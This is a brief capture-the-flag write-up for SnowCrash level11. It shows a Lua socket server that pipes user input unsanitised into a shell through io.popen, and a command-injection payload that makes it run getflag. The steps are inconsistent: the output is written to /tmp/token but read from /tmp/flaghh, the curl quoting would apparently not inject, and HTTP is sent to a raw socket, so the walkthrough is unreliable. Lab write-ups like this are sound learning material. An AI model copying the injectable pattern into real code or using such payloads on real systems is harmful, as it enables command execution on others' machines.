# SnowCrash Level11

Let's go ahead and cat that level11.lua :
```
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

At first I satrted thinking of a way to decrypt that hash in order to give it as a Password.
But even if I did give it nothing would eventually happen.
Still I followed this idea. And then I realized it was a rabbit hole.
After that, I started executing the code online line by line.
I found out that whatever I pass in the password is gonna be used in the following line :
```
prog = io.popen("echo "...pass..." | sha1sum", "r")
```

It's like an RCE(remote code execution).
A simple way to solve this challenge is in the following :
Just print flag in a file and then read it, since we the output of echo command is redirected with a pipe to sha1sum.
```
level11@SnowCrash:~$ curl 'localhost:5151/?Password=";getflag > /tmp/token"'
Password: Erf nope..
level11@SnowCrash:~$ cat /tmp/flaghh
Check flag.Here is your token :
```
